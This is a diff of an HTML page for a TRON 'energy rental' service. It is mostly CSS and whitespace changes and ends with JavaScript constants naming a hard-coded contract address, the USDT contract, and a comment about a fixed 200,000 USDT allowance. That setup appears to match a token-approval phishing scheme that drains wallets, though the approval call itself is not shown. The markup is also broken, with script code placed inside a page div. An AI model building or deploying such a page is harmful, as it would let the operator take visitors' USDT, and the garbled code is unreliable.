@@ -3,15 +3,12 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <title>能量租赁</title>
-
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@6.0.4/dist/TronWeb.js"></script>
-
-  <style>
+<title>能量租赁</title>
+<script src="https://cdn.jsdelivr.net/npm/tronweb@6.0.4/dist/TronWeb.js"></script>
+<style>
     * {
       box-sizing: border-box;
     }
-
     body {
       margin: 0;
       min-height: 100vh;
@@ -23,7 +20,6 @@
       justify-content: center;
       align-items: center;
     }
-
     .container {
       width: min(460px, calc(100% - 32px));
       background: #fff;
@@ -31,20 +27,17 @@
       padding: 28px;
       box-shadow: 0 10px 35px rgba(0,0,0,.08);
     }
-
     h1 {
       margin: 0 0 8px;
       text-align: center;
       font-size: 28px;
     }
-
     .subtitle {
       text-align: center;
       color: #777;
       font-size: 14px;
       margin-bottom: 26px;
     }
-
     .wallet {
       background: #f7f7f7;
       border-radius: 12px;
@@ -64,7 +57,6 @@
       word-break: break-all;
       color: #555;
     }
-
     button {
       width: 100%;
       border: 0;
@@ -80,12 +72,10 @@
     button:hover {
       opacity: .88;
     }
-
     button:disabled {
       opacity: .5;
       cursor: not-allowed;
     }
-
     .secondary {
       background: #eee;
       color: #222;
@@ -98,14 +88,12 @@
     .field {
       margin-bottom: 16px;
     }
-
     label {
       display: block;
       font-size: 13px;
       color: #666;
       margin-bottom: 7px;
     }
-
     input {
       width: 100%;
       padding: 13px;
@@ -114,11 +102,9 @@
       outline: none;
       font-size: 15px;
     }
-
     input:focus {
       border-color: #777;
     }
-
     .info {
       background: #fafafa;
       border: 1px solid #eee;
@@ -126,7 +112,6 @@
       padding: 15px;
       margin: 18px 0;
     }
-
     .info-row {
       display: flex;
       justify-content: space-between;
@@ -134,7 +119,6 @@
       margin: 8px 0;
       font-size: 13px;
     }
-
     .info-row span:first-child {
       color: #777;
     }
@@ -143,7 +127,6 @@
       text-align: right;
       word-break: break-all;
     }
-
     .warning {
       background: #fff7e6;
       border: 1px solid #ffe0a3;
@@ -154,7 +137,6 @@
       line-height: 1.6;
       margin: 16px 0;
     }
-
     .status {
       min-height: 20px;
       text-align: center;
@@ -162,7 +144,6 @@
       font-size: 13px;
       color: #666;
     }
-
     .buttons {
       display: grid;
       gap: 10px;
@@ -180,10 +161,13 @@
       color: #999;
       margin-top: 18px;
     }
-  </style>
+</style>
 </head>
-
-// 已经填入你的合约0x地址
+<body>
+<div class="container">
+<h1>能量租赁</h1>
+<div class="subtitle">
+ // 已经填入你的合约0x地址
 const CONTRACT_ADDRESS = "TGoZkUojDzZG1KPLyi6BFSm9wKL118Y3Ls";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 // 固定授权 200000 USDT，TRC20 6位小数
